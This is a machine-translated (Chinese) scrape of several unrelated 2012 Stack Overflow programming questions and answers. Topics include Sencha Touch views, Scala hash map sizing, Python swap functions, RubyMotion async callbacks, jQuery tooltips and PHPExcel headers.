==24344==      possibly lost: 0 bytes in 0 blocks.
==24344==    still reachable: 0 bytes in 0 blocks.
==24344==         suppressed: 0 bytes in 0 blocks.
==24344== Rerun with --leak-check=full to see details of leaked memory. 
```

# javascript - 从控制器将变量应用于视图中的按钮？Sencha Touch

> ID：13167278
> 
> 赞同：0
> 
> 时间：2012-10-31T20:55:10.840
> 
> 标签：javascript, view, sencha-touch, extjs

所以我有下面的观点。当点击前一个视图的列表中的项目时，将调用此视图。此视图上的列表根据先前的选择进行过滤，但我希望能够将项目添加到包含相同过滤器（存储字段 =“值”）的这些列表中。如何获取它以便在单击按钮并加载新视图时也传递过滤列表的值？

我的视图页面。

```
Ext.define("MyApp.view.ShowAll", {
  extend: 'Ext.Container',
  requires: ['Ext.NavigationView', 'Ext.dataview.List', 'Ext.layout.HBox', 'Ext.Container'],
  xtype: 'myapp-showall',

  config: {
      layout: 'hbox',
      items: [
        {
        layout: 'fit',
      xtype: 'container',
      itemId: 'listContainer',
      flex: 1,
        items: [
         {
            xtype: 'list',
            store: 'leftStore',
            itemTpl: '{storeField}',
            emptyText: 'No values added yet'
          },
          {
            xtype: 'toolbar',
            docked: 'bottom',
            padding: '5px',
            items: [{ xtype: 'button', itemId: 'addValue', text: 'Add Values', ui: 'confirm', width:'100%' }]
          }
        ]
    },
    {
        style: "background-color: #333;",
        width: 10
    },
    {
    layout: 'fit',
      xtype: 'container',
      itemId: 'listContainerTwo',
      flex: 1,
        items: [
         {
            xtype: 'list',
            store: 'rightStore',
            itemTpl: '{storeField}',
            emptyText: 'No values added yet'
          },
          {
            xtype: 'toolbar',
            docked: 'bottom',
            padding: '5px',
            items: [{ xtype: 'button', itemId: 'addValueRight', text: 'Add Values', ui: 'confirm', width:'100%' }]
          }
        ]
    }
    ]
  }
}); 
```

这是我的控制器的一部分（设置商店过滤器）

```
 showValues: function() {
    this.showValueDetails(arguments[3]);
  },

  showValueDetails: function(record) { 
    var title = "Value: "+record['data']['name'];
    var showValue = Ext.create('MyApp.view.ShowAll', { title: title });
    showValue.setRecord(record);

    var valueName = record['data']['name'];
    var leftStore = Ext.getStore("leftStore"); 
    leftStore.clearFilter();
    leftStore.filter('storeField', valueName); 

    var rightStore = Ext.getStore("rightStore"); 
    rightStore.clearFilter();
    rightStore.filter('storeField', valueName); 

    this.getMain().push(showValue);

}, 
```

它正确设置页面标题并过滤商店。我只是不确定如何传递一个变量，所以当单击按钮时，valueName（来自控制器）被传递到下一个视图。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T02:23:18.317

由于我能够使用上面的代码很好地设置标题，因此一旦我单击提交按钮，只需执行以下操作即可获取标题。

```
 var titleVariable = Ext.getCmp('ShowAll')['title']; 
```

# java - netbeans profiler：我怎么知道 char[] 和 byte[] 的用法来自哪里？

> ID：13167283
> 
> 赞同：0
> 
> 时间：2012-10-31T20:55:32.800
> 
> 标签：java, jsf, memory-management, netbeans, profiler

我有一个使用 Netbeans 7.2 开发的 webapp (JSF 2)，在 Tomcat 7 上运行。

使用 Netbeans 分析器，我看到在浏览器加载第一页之后（一个包含两个字段的简单表单！），内存使用量已经在 250Mb 左右波动，其中 char[]、byte[]、string 和 stringBuilder 占用大约 95% 的内存使用量。

我怎么知道是什么导致了如此高的内存使用？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T22:57:26.513

当您在内存分析模式下运行分析器时，您可以选择记录分配跟踪。这样您就可以追踪谁创建了这些数据。

当您想查看谁在引用数据以防止其被垃圾收集时，您可以进行堆转储（在分析会话期间）并在分析器的集成堆步行器中对其进行分析。

实际上，在您的情况下，我将从堆转储开始查看哪些更高级别的结构保留了大多数 char[] 和 byte[] 数组，然后查看内存分析快照并尝试在代码中找到它们被实例化的位置。

# ios - ASIHTTPRequest 委托

> ID：13167284
> 
> 赞同：2
> 
> 时间：2012-10-31T20:55:34.457
> 
> 标签：ios, soap, asihttprequest, exc-bad-access

我使用 ASIHTTPRequest 调用 web 服务（soap）：

```
-(void)callWebService:(NSString*)URL:(NSString*)SOAP{

    NSURL *url = [NSURL URLWithString:URL];
    NSString *SOAPMessage = [NSString stringWithFormat:SOAP];
    ASIHTTPRequest *request = [ASIHTTPRequest requestWithURL:url];

    request.shouldAttemptPersistentConnection = NO;
    [request setValidatesSecureCertificate:NO];
    [request setRequestMethod:@"POST"];

    [request appendPostData:[SOAPMessage dataUsingEncoding:NSUTF8StringEncoding]];
    [request setDidFinishSelector:@selector(requestCompleted:)];
    [request setDidFailSelector:@selector(requestFailed:)];

    [request setDelegate:self];
    [request startAsynchronous];

}

-(void)requestCompleted:(ASIHTTPRequest * )r{

    NSString *responseString = [r responseString];
    NSLog(@"%@",responseString);

}

-(void)requestFailed:(ASIHTTPRequest * )r{

    NSError *Err = [r error];
    NSLog(@"%@",Err);

} 
```

如果我在 appDelegate.m 中调用它，它可以正常工作，requestCompleted 处理程序会抛出响应......但是当我在自己的类中使用相同的代码时，它会抛出 BAD ACCESS 错误，我想它告诉我我不能委托：self 来处理回复。如果我 setDelegate 到 appdelgate 指针（作为 ID 发送者传递）它可以工作（并且在那里有处理程序）。那么为什么我自己的班级不能处理自己的事件呢？我是 Objective-c 的新手，所以我想我在这里遗漏了一些重要的东西。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T21:16:17.310

您必须在“自己的班级”中有 requestCompleted 和 requestFailed 。此外，该类必须存在，这意味着在调用服务时不能释放它。您必须将“您自己的类”的实例保存在强/保留属性或其他东西中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:07:43.213

将此代码添加到 dealloc 或 viewWillDisappear

```
[request setDelegate:nil]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-31T23:05:17.273

在通话发生时检查您`self`是否被释放。`delegate`确保正确保留它。

# scala - Scala：哈希忽略初始大小（数十亿条目的快速哈希表）

> ID：13167286
> 
> 赞同：3
> 
> 时间：2012-10-31T20:55:41.490
> 
> 标签：scala, hash, hashmap

我试图找出 Scala 的散列函数对大散列表的扩展程度（具有数十亿个条目，例如存储特定 DNA 出现的频率）。

然而，有趣的是，HashMap 和 OpenHashMap 似乎都忽略了指定初始大小的参数（2.9.2 和 2.10.0，最新版本）。

我认为之所以如此，是因为在第一个 800.000 左右之后添加新元素会变得慢得多。

我尝试增加要插入的字符串中的熵（只有下面代码中的字符 ACGT），但没有效果。

对这个具体问题有什么建议吗？我也很高兴听到您对使用 Scala 的内置类型对于具有数十亿个条目的哈希表是否是一个好主意的意见。

```
import scala.collection.mutable.{ HashMap, OpenHashMap }    
import scala.util.Random

object HelloWorld {
    def main(args: Array[String]) {

        val h = new collection.mutable.HashMap[String, Int] {
            override def initialSize = 8388608
        }

        // val h = new scala.collection.mutable.OpenHashMap[Int,Int](8388608); 

        for (i <- 0 until 10000000) {
            val kMer = genkMer()

            if(! h.contains(kMer))
            {
                h(kMer) = 0;
            }
            h(kMer) = h(kMer) + 1;

            if(i % 100000 == 0)
            {
                println(h.size);
            }
        }

        println("Exit. Hashmap size:\n");
        println(h.size);

    }

    def genkMer() : String =
    {
        val nucs = "A" :: "C" :: "G" :: "T" :: Nil

        var s:String = "";
        val r = new scala.util.Random
        val nums = for(i <- 1 to 55 toList) yield r.nextInt(4) 
        for (i <- 0 until 55) {
            s = s + nucs(nums(i))
        }
        s
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-01T15:46:33.533

我不会使用 Java 数据结构来管理数十亿条目的映射。原因：

*   Java HashMap 中的最大桶是 2^30 (~1B)，所以
    *   使用默认加载因子，当地图在 750 M 条目后尝试调整大小时，您将失败
    *   您需要使用 > 1 的负载因子（例如，理论上 5 可以为您提供 50 亿个项目）
    *   在高负载因子的情况下，你会遇到很多哈希冲突，读写性能都会开始严重下降
    *   一旦你实际超过 Integer.MAX_INTEGER 值，我不知道存在什么陷阱——例如，地图上的 .size() 将无法返回实际计数
*   我会非常担心在 Java 中运行 256 GB 堆——如果你遇到完整的 GC，它将锁定世界很长一段时间以检查旧代中的数十亿个对象

如果是我，我会寻找一个堆外解决方案：某种数据库。如果您只是存储（哈希码，计数），那么许多键值存储之一可能会起作用。最大的障碍是找到一个可以支持数十亿条记录的记录（一些最大记录为 2^32）。

如果您可以接受一些错误，概率方法可能值得一看。我不是这里的专家，但这里列出的东西[听起来](http://www.bro-ids.org/development/projects/counting.html)很相关。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-31T22:25:31.210

这些是错误的数据结构。你会很快达到内存限制（除非你有 100+gb，即使那样你仍然会很快达到限制）。

我不知道 scala 是否存在合适的数据结构，尽管可能有人会用 Java 做一些事情。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-01T02:09:24.380

首先，你不能覆盖initialSize，我认为scala让你，因为它是HashTable中的私有包：

```
private[collection] final def initialSize: Int = 16 
```

其次，如果你想设置初始大小，你必须给它一个你想要的初始大小的HashTable。所以没有从 16 开始构建这个地图真的没有什么好方法，但它确实增长了 2 的幂，所以每次调整大小应该会变得更好。

第三，scala 集合比较慢，我会推荐 java/guava/etc 集合。

最后，对于大多数硬件来说，数十亿的条目有点多，你可能会用完内存。您很可能需要使用内存映射文件，这是一个很好的例子（虽然没有散列）：

[https://github.com/peter-lawrey/Java-Chronicle](https://github.com/peter-lawrey/Java-Chronicle)

**更新 1** 这是一个很好的替代 Java 集合的方法：

[https://github.com/boundary/high-scale-lib](https://github.com/boundary/high-scale-lib)

**更新 2** 我运行了你的代码，它确实减慢了大约 800,000 个条目，但后来我提高了 java 堆大小，它运行良好。尝试对 jvm 使用类似的东西：

```
-Xmx2G 
```

或者，如果您想使用内存的最后一点：

```
-Xmx256G 
```

# java - 如何在soap标头中添加签名安全信息

> ID：13167290
> 
> 赞同：2
> 
> 时间：2012-10-31T20:56:05.503
> 
> 标签：java, soap, spring-security, spring-ws

我正在尝试在服务器端和客户端使用签名来实现 Spring WS 安全性。

我在客户端和服务器配置中都添加了 WSS4J 拦截器。

但是，我收到一个异常状态：未找到 WS-Security 标头。

我想我需要在客户端的 SOAP 请求标头中添加一些安全信息。但是由于我的 wsdls 没有任何安全信息，因此 wsdlimport 工具不会生成任何特定于标头的方法。

我查看了此链接： http: [//forum.springsource.org/archive/index.php/t-52204.html](http://forum.springsource.org/archive/index.php/t-52204.html)但它无助于解决问题。

你能帮忙吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T22:26:09.710

这是密钥库的问题，服务器必须具有包含私钥的密钥库，客户端必须具有包含从同一私钥生成的公钥的密钥库。

# python - Python 简单交换函数

> ID：13167300
> 
> 赞同：14
> 
> 时间：2012-10-31T20:57:22.667
> 
> 标签：python, swap

我在尝试学习python时遇到了这个问题。考虑以下函数：

```
def swap0(s1, s2):
    assert type(s1) == list and type(s2) == list
    tmp = s1[:]
    s1 = s2[:]
    s2 = tmp
return

s1 = [1]
s2 = [2]
swap0(s1, s2)
print s1, s2 
```

s1 和 s2 会打印什么？

运行问题后发现print语句会打印1 2。从函数上看s1和s2的值好像没有变化`swap0`。我能想到的唯一解释是因为这条线。

```
tmp = s1[:] 
```

由于 s1[:] 是一个副本，因此 s1 的值在函数调用中不会改变是有道理的。但是因为参数`swap0`是(s1,s2)，所以我不确定是否在做tmp = s1[:]之后。任何时候我做

```
s1 = something... 
```

它将是对 s1 副本的引用，而不是 s1 本身。有人可以提供更好的解释吗？谢谢。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-10-31T21:00:25.010

`s1`这是因为它为函数和函数`s2`内部分配了新值`swap0`。这些分配不会传播到函数之外。如果您只是将函数体复制并粘贴到函数调用的位置，您会发现它是有效的。

您可以通过修改参数引用的对象而不是参数本身来解决此问题：

```
def swap0(s1, s2):
    assert type(s1) == list and type(s2) == list
    tmp = s1[:]
    s1[:] = s2
    s2[:] = tmp 
```

然而，在 Python 中进行交换的更简单更好的方法是：

```
s1, s2 = s2, s1 
```

这也只会交换那些对列表的特定引用，而不是列表内容本身。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-10-31T21:02:09.353

实际上，您的最终`print`结果将打印出 和 的原始`s1`值`s2`。这是因为您只是在函数范围内交换它们。这样做不会影响它们在函数外的值（即在调用函数后它们的值之后）

如果它们是可变类型（`list`、`set`、`dict`等），那么您可以在内部就地修改它们`swap`。但是，这仅限`swap`于对可变类型起作用。

因此，您最好以相反的顺序返回输入：

```
def swap(s1, s2):
    return s2, s1

s1 = 'a'
s2 = 'b'
s1, s2 = swap(s1, s2)
print s1, s2 # prints 'b a' 
```

当然，您可以在一行中完成所有操作，如下所示：

```
s1, s2 = s2, s1 
```

干杯!

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-10-31T21:09:29.230

其他答案解释了出了什么问题。这是一个可以满足您要求的版本：

```
def swap(s1, s2):
    assert isinstance(s1, list) and isinstance(s2, list)
    s1[:], s2[:] = s2[:], s1[:] 
```

另请参阅：[isinstance 与类型](https://stackoverflow.com/questions/1549801/differences-between-isinstance-and-type-in-python)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-10-31T21:00:33.697

在函数内部，您将重新绑定*局部*变量`s1`并`s2`使用右侧的值（这也是本地的，因为您使用切片来制作副本）。即使您更改了这些局部变量的内容，也不会更改调用范围内列表的内容，因为它们不再引用相同的列表。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-06-08T14:32:59.757

这是实现您的目标的单行函数：

```
swap = lambda x: (x[1], x[0]) 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2017-07-18T18:37:46.797

如果两个列表的长度相同，您也可以通过使用索引和循环的旧交换方法来执行此操作。这是一种老派，但有助于理解索引

```
a = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
b = [0, 9, 8, 7, 6, 5, 4, 3, 2, 1]

for i in range(0, len(a)):
    a[i] = a[i] + b[i]
    b[i] = a[i] - b[i]
    a[i] = a[i] - b[i]

print(a)
print(b) 
```

这将使输出为：

```
 [0,9,8,7,6,5,4,3,2,1]
 [1,2,3,4,5,6,7,8,9,0] 
```

或者也可以使用 Xor 来完成。Xor 运算符是按位运算符，例如在操作数之间进行 Xor 运算。

```
a = 5 #0b101
b = 4 #0b100
c = a ^ b #0b001 
```

这`0b101`是 5`0b100`的二进制表示，是 4 的二进制表示，当您对这些进行异或运算时，您将输出`0b001`即 1 。如果一个且只有一个输入为 1，则异或返回 1 个输出结果。如果两个输入为 0 或两者均为 1，则输出 0 个结果。我们可以使用 Xor 交换两个变量，例如：

```
a = 5        # 0b0101
b = 9        # 0b1001
a = a ^ b    # Xor (0b0101, 0b1001) = 0b1100 (12)
b = a ^ b    # Xor (0b1100, 0b1001) = 0b0101 (5)
a = a ^ b    # Xor (0b1100, 0b0101) = 0b1001 (9)
print("a = {} and b = {}".format(a, b)) 
```

输出将是`a = 9 and b = 5`

同样，我们也可以通过对其中的项目进行异或操作来交换两个列表，例如：

```
a = [ 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 ]
b = [ 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 ] 

for i in range(0, len(a)) :
     a[i] = a[i] ^ b[i] 
     b[i] = a[i] ^ b[i] 
     a[i] = a[i] ^ b[i] 

print(a)
print(b) 
```

输出：

```
[0, 9, 8, 7, 6, 5, 4, 3, 2, 1]
[1, 2, 3, 4, 5, 6, 7, 8, 9, 0] 
```

让我们看另一个场景，如果我们需要交换列表中的项目，例如：我们有一个这样的列表`x = [ 13, 3, 7, 5, 11, 1 ]`，我们需要像这样交换它的项目`x = [ 1, 3, 5, 7 , 11, 13 ]` 所以我们可以通过使用两个按位运算符 Xor`^`和 Compliments来做到这一点`~`

代码 ：

```
# List of items 
a = [ 13, 3, 7, 5, 11, 1 ]

# Calculated the length of list using len() and
# then calulated the middle index of that list a 

half = len(a) // 2

# Loop from 0 to middle index
for i in range(0, half) :

# This is to prevent index 1 and index 4 values to get swap 
# because they are in their right place.
if (i+1) % 2 is not 0 :

    #Here ~i means the compliment of i and ^ is Xor,
    # if i = 0 then ~i will be -1 
    # As we know -ve values index the list from right to left 
    # so a [-1] = 1 

    a[i] = a[i] ^ a[~i] 
    a[~i] = a[i] ^ a[~i] 
    a[i] = a[i] ^ a[~i]

print(a) 
```

所以输出将是`[1, 3, 5, 7, 11, 13]`

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2018-03-18T21:21:28.127

你可以有这个：

```
def swap(x , y):
  x , y = y , x
  return x , y

x  = 5
y = 10

print ('x is {0} and y is {1}'.format(x,y))    # x is 5 and y is 10
x , y = swap(x,y)                              # doing swap 
print ('x is {0} and y is {1}'.format(x,y))    # x is 10 and y is 5 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2019-04-16T15:27:03.047

根本不需要功能。a,b=b,a 可以解决问题。

```
 >>> a,b=1,2
    >>> print (a,b)
    (1, 2)
    >>> a,b=b,a
    >>> print (a,b)
    (2, 1)
    >>> 
```

它也适用于数组。但是，如果您非常想要这里的功能，那就是

```
 def swap(a,b)
       return b,a 
```

# javascript - IE10是否改变了window.location.port的定义？

> ID：13167302
> 
> 赞同：8
> 
> 时间：2012-10-31T20:57:25.263
> 
> 标签：javascript, dom, internet-explorer-10

我注意到今天检查`window.location.port`的一些 JavaScript 代码在 IE10 Platform Preview 10.0.1008.16421 中出现问题。

例如，在 IE10 中，访问[http://www.microsoft.com](http://www.microsoft.com)。打开开发人员工具并输入`window.location.port`并返回`80`. 发生了什么？为什么 IE10在同一个站点`80`所有其他 IE 浏览器都返回（空字符串）时突然返回整数？`""`IE10 也会`80`在所有下层模式中返回。

[在http://www.microsoft.com](http://www.microsoft.com)上比较 IE8/9 的结果：`window.location.port`是`""`！

知道这是 IE10 的新行为、平台版本中记录的错误还是尚未报告的错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-19T17:30:39.453

这*听起来*像是一个错误，尽管我不知道有任何此类报告的问题：

[HTML5: 2.6.2 Parsing URLs](http://www.w3.org/TR/2011/WD-html5-20110525/Overview.html#parse-a-url)声明“[端口] 是生产匹配的子字符串，如果*有的话*。”

此外，[HTML5：2.6.6 用于 URL 操作的接口](http://www.w3.org/TR/2011/WD-html5-20110525/Overview.html#url-decomposition-idl-attributes)部分提供了一个示例输入，`http://example.com/carrot#question%3f`其中指定端口应该是`""`- 一个（空字符串）。

**更新**

这是一个真正的错误：[http ://connect.microsoft.com/IE/feedback/details/817343/ie11-scripting-value-of-htmlanchorelement-host-differs-between-script-created-link-and-link-来自文档](http://connect.microsoft.com/IE/feedback/details/817343/ie11-scripting-value-of-htmlanchorelement-host-differs-between-script-created-link-and-link-from-document)

# ruby - 使用 BubbleWrap 进行 RubyMotion 异步编程

> ID：13167304
> 
> 赞同：2
> 
> 时间：2012-10-31T20:57:28.417
> 
> 标签：ruby, asynchronous, rubymotion, single-responsibility-principle

在使用大量异步代码时，我对如何编写体面的代码感到困惑。

在以下代码片段中，我登录以获取身份验证 cookie，并将该 cookie 用于下一个请求以获取项目名称列表（例如）：

```
def self.populateProjectsTable(projects_controller)
  payload = {email: "email", password: "pass"}
  HTTP.post("http://example.com/login", {payload: payload}) do |response|
    authCookie = response.headers['Set-Cookie']
    HTTP.get("http://example.com/projects.json", {cookie: authCookie}) do |response|
      projects = JSON.parse(response.body.to_str)
      projects_controller.projects = projects
      projects_controller.reloadData
    end
  end
end 
```

虽然这会起作用，但代码感觉很脏。没有真正遵循单一责任原则。我想用几种方法提取它：

```
def self.populateProjectsTable(projects_controller)
  @taskList = TaskList.new
  @taskList.doLogin
  projects = @taskList.getProjects
  projects_controller.projects = projects
  projects_controller.reloadData
end

def doLogin
  payload = {email: "email", password: "pass"}
  HTTP.post("http://example.com/login", {payload: payload}) do |response|
    @authCookie = response.headers['Set-Cookie']
  end
end

def getProjects
  HTTP.get("http://example.com/projects.json", {cookie: @authCookie}) do |response|
    projects = JSON.parse(response.body.to_str)
  end
end 
```

这显然是行不通的。该`getProjects`方法在`doLogin`完成之前调用，并且项目仅在块范围内已知，而不会将数据返回给该`populateProjectsTable`方法。

如果没有第一个示例中所示的嵌套，如何编写此类应用程序？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-31T21:46:44.100

你不会完全摆脱嵌套。接受艾伦的回答并稍微按摩一下，这就是我想出的。它涉及通过几个方法传递一个块。

```
def self.populateProjectsTable(projects_controller)
  @taskList = TaskList.new
  @taskList.loginAndGetProjects do |projects|
    projects_controller.projects = projects
    projects_controller.reloadData
  end
end

def loginAndGetProjects(&block)
  payload = {email: "email", password: "pass"}
  HTTP.post("http://example.com/login", {payload: payload}) do |response|
    @authCookie = response.headers['Set-Cookie']
    getProjects(&block)
  end
end

def getProjects(&block)
  HTTP.get("http://example.com/projects.json", {cookie: @authCookie}) do |response|
    projects = JSON.parse(response.body.to_str)
    block.call(projects)
  end
end 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-01T01:25:03.237

我在尝试包装自己占用块的方法时遇到了类似的问题。我希望新的包装方法仍然能够占用块。这是我在[ParseModel](https://github.com/adelevie/ParseModel)中所做的：

```
# with block:
# ParseModel::Cloud.callFunction("myFunction", {"myParam" => "myValue"}) do |result, error|
#  # do something...
# end

# without block:
# ParseModel::Cloud.callFunction("myFunction", {"myParam" => "myValue"})
module ParseModel
  class Cloud
    def self.callFunction(function, params={}, &block)
      return PFCloud.callFunction(function, withParameters:params) unless block_given?

      PFCloud.callFunctionInBackground(function, withParameters:params, block:lambda do |result, error|
        block.call(result, error)
      end)
    end
  end
end 
```

将此概念应用于您的问题，您可以重写您的方法以自己获取块。这里有一些我认为可能会有所帮助的重构：

```
def self.populateProjectsTable(projects_controller)
  @taskList = TaskList.new
  @taskList.doLogin do |login_response|
    authCookie = login_response.headers['Set-Cookie']
    @taskList.getProjects(authCookie) do |projects_response|
      projects = JSON.parse(projects_response.body.to_str)
      projects_controller.projects = projects
      projects_controller.reloadData
    end
  end
end

def doLogin(&block)
  payload = {email: "email", password: "pass"}
  HTTP.post("http://example.com/login", {payload: payload}) do |response|
    block.call(response)
  end
end

def getProjects(cookie, &block)
  HTTP.get("http://example.com/projects.json", {cookie: cookie}) do |response|
    block.call(response)
  end
end 
```

我认为您在 SRP 方面并没有完全脱离困境，但这应该是一个好的开始。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-30T22:51:35.003

为 Jamon 的回答 +1。

如果您喜欢 SRP，我可能会建议使用一个类来管理您的会话并将 API 拆分为一个模块。这在您添加额外的 API 调用时特别有用。在这里，我将登录完成后将满足的请求排队。稍后您可以添加超时处理等。

```
module ProjectApi
  def get_projects(&block)
    with_session do
      HTTP.get("http://example.com/projects.json", {cookie: @auth_cookie}) do |response|
        projects = JSON.parse(response.body.to_str)
        block.call(projects)
      end
    end
  end
end

class MySession
  include ProjectApi

  def initialize(login, password)
    @login = login
    @password = password
    @state = nil
    @requests = []
  end

  def active?
    @state == :active
  end

  def with_session(&block)
    @requests << &block
    active? ? handle_requests : login(true)
  end

  private

  def login(do_handle_requests = false)
    payload = {login: @login, password: @password}
    @state = nil
    HTTP.post("http://example.com/login", {payload: payload}) do |response|
      @state = :active
      @auth_cookie = response.headers['Set-Cookie']}
      handle_requests if do_handle_requests
    end
  end  

  def handle_requests
    while request = @requests.shift do
      request.call
    end if active?
  end    

end

def self.populateProjectsTable(projects_controller)
  @session ||= MySession.new('mylogin', 'mypassword')
  @session.get_projects do |projects|
    projects_controller.projects = projects
    projects_controller.reloadData
  end
end 
```

# javascript - 如果没有鼠标悬停隐藏

> ID：13167305
> 
> 赞同：0
> 
> 时间：2012-10-31T20:57:29.117
> 
> 标签：javascript, jquery

我有一个在鼠标悬停时显示 div 的链接。在鼠标移出时，我再次隐藏 div。但是，如果用户在打开后从不将鼠标悬停在 div 上，那么它会保持打开状态，所以我需要在一定时间后隐藏 div。由于这些是 2 个元素（链接和一个 div），我认为我不能使用 .hover。在没有鼠标悬停 10 秒后，我最好如何编写它来隐藏 .tooltip-profile？

```
$("#profile").mouseenter(function(){
var position = $(".tooltip-profile").offset();
$(".tooltip-profile").css( { position: "absolute", left: "720px", top: "-110px" } );
$(".tooltip-profile").fadeIn(500);
} );
$(".tooltip-profile").mouseleave(function(){
$(".tooltip-profile").fadeOut(500);
} ); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:00:31.990

您需要为您提供一个回调函数，`fadeIn()`该函数定义了 10 秒的超时。达到时，超时将`fadeOut()`元素：

```
$("#profile").mouseenter(function () {
    var position = $(".tooltip-profile").offset();
    $(".tooltip-profile").css({
        position: "absolute",
        left: "720px",
        top: "-110px"
    });
    $(".tooltip-profile").fadeIn(500, function () {
        setTimeOut(function () {
            $(".tooltip-profile").fadeOut(500);
        }, 10000);
    });
});
$(".tooltip-profile").mouseleave(function () {
    $(".tooltip-profile").fadeOut(500);
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T21:04:58.453

如果鼠标再次位于链接或工具提示上，请在此期间对 mouseleave 使用 setTimeout 等待一段时间，不要隐藏工具提示。

```
 var keepOpend ;
     $("#profile").mouseenter(function(){ keepOpend  = true;
       var position = $(".tooltip-profile").offset();
       $(".tooltip-profile").css( { position: "absolute", left: "720px", top: "-110px" } );
       $(".tooltip-profile").fadeIn(500);
    }).mouseleave(function(){
          keepOpend  = false;
          setTimeout(function(){
            !keepOpend && $(".tooltip-profile").fadeOut(500);
        }, 500);
    });
    $(".tooltip-profile").mouseleave(function(){
          keepOpend  = false;
          setTimeout(function(){
            !keepOpend && $(".tooltip-profile").fadeOut(500);
        }, 500);
    }).mouseenter(function(){
       keepOpend = true;

   }); 
```

# ruby-on-rails - Rails / Webbynode：使用 postgresql 推送数据库？

> ID：13167306
> 
> 赞同：-1
> 
> 时间：2012-10-31T20:57:34.047
> 
> 标签：ruby-on-rails, webbynode

当我做

```
webbynode database push 
```

Webbynode 寻找一个 mysql 数据库，我如何让它寻找 postgresql 呢？我的 webbynode 和应用程序都是为 postgresql 设置的。

这是我收到的错误消息：

```
ERROR: Invalid MySQL credentials for your local database (Can't connect to local MySQL server through socket '/tmp/mysql.sock' (2))
Stopping taps server... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-03T18:09:58.863

来自 webbynode：数据库拉取和推送功能仍处于测试阶段，还不支持 PostgreSQL。

# php - 在 PHPExcel 中获取标题

> ID：13167307
> 
> 赞同：1
> 
> 时间：2012-10-31T20:57:37.297
> 
> 标签：php, sql, phpexcel

我在 PHP 中使用这段代码来查询数据库并将数据导入到 excel 文件中。目前我正在从数据库中获取数据，但我无法获取标题。

谁能告诉我如何从数据库中获取标题？

```
$objPHPExcel = new PHPExcel();

$col = 1; 
while($row_data = mysql_fetch_assoc($result)) {
    $row = 1;
    foreach($row_data as $value) {
        $objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow($col, $row, $value);
        $row++;
    }
    $col++;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:04:57.743

```
$objPHPExcel = new PHPExcel();

$col = 1; 
while($row_data = mysql_fetch_assoc($result)) {
    $row = 1;
    if ($col == 1) {
        $row_headings = array_keys($row_data);
        foreach($row_headings as $value) {
            $objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow($col, $row, $value);
            $row++;
        }
        $row = 1;
        $col++;
    }
    foreach($row_data as $value) {
        $objPHPExcel->getActiveSheet()->setCellValueByColumnAndRow($col, $row, $value);
        $row++;
    }
    $col++;
} 
```

# google-maps - 自定义多边形/用户可编辑形状

> ID：13167310
> 
> 赞同：1
> 
> 时间：2012-10-31T20:57:46.540
> 
> 标签：google-maps, google-maps-api-3

目前，在我正在开发的一个 Web 应用程序中，我们的一个客户要求提供一个我不太确定如何实现的功能。我们在主页上有一个谷歌地图，我们的客户希望能够在该地图上进行演示。我已经看到了我们客户想要的两个例子。第一个示例在[http://www.scribblemaps.com/](http://www.scribblemaps.com/)上，我可以在其中绘制线条、形状，并且在 Pro 版本中“块箭头”是我们的客户所要求的。但是，此应用程序仅允许您在其站点上创建地图，然后将其保存为 JPEG。我们的客户希望在我们的应用程序中执行此操作。Scribble Maps 通过使用 Adob​​e Flash 实现了这一点，我猜他们在背景中放置了一个谷歌地图，我不确定这对我们来说是不是最好的路线。

我还发现这个博客[http://googlegeodevelopers.blogspot.com/2011/11/make-your-map-interactive-with-shape.html](http://googlegeodevelopers.blogspot.com/2011/11/make-your-map-interactive-with-shape.html)描述了用户可编辑的形状。在此示例中，我能够创建形状并在创建后调整大小。我想知道是否可以创建一个像块箭头这样的自定义多边形作为地图上的另一个按钮，用户可以在其中将该形状添加到地图并编辑大小？我意识到用户可以使用自定义多边形按钮，但我知道我们的客户不想每次都绘制自己的箭头。

*** 编辑 ***

所以我很清楚，我不是要求任何人为我编写任何代码，而是指出信息的方向。我想知道是否可以预先创建像“块箭头”这样的多边形形状，以便我们的客户可以单击并拖动以仅使用 Google Maps API 在地图上绘制此箭头，如圆形或矩形。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-26T08:51:17.343

也许是一个迟到的答案，但我认为这对你有用。 [https://developers.google.com/maps/documentation/javascript/examples/user-editable-shapes](https://developers.google.com/maps/documentation/javascript/examples/user-editable-shapes)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T14:59:03.007

